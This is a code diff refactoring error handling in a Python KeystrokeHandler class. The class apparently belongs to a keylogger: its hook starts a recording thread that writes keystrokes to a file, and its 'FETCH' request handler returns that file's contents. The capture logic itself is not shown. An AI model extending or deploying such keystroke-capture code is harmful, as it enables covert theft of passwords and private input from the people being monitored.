@@ -86,7 +86,7 @@ class KeystrokeHandler:
         try:
             extraData = ""
             if reqCode == "FETCH":
-                assert self.hooked
+                assert self.hooked, "Hook has not been installed"
 
                 file.close()
                 file = open(self.filepath, "r")
@@ -118,35 +118,25 @@ class KeystrokeHandler:
         global stop, file
 
         #Open file in append mode
-        try:
-            assert not self.hooked
+        assert not self.hooked, "Hook is already installed"
 
-            file = open(self.filepath, "a+")
-            self.thread = RecordWrapper()
-            stop = False
-            self.thread.start()
-            self.hooked = True
-        except Exception as e:
-            print(e)
-            return HandlerState.FAILED, None
-        pass
+        file = open(self.filepath, "a+")
+        self.thread = RecordWrapper()
+        stop = False
+        self.thread.start()
+        self.hooked = True
 
     def Unhook(self):
         global stop, file
-        try:
-            assert self.hooked
-            stop = True
-            self.thread.join()
         
-        #close file for real
-            if file:
-                file.close()
-                file = None
-
-            self.hooked = False
-        except Exception as e:
-            print(e)
-            return HandlerState.FAILED, None
+        assert self.hooked, "Hook is not installed"
+        stop = True
+        self.thread.join()
+        
+        if file:
+            file.close()
+            file = None
+        self.hooked = False
 
     def __del(self):
         self.Unhook()
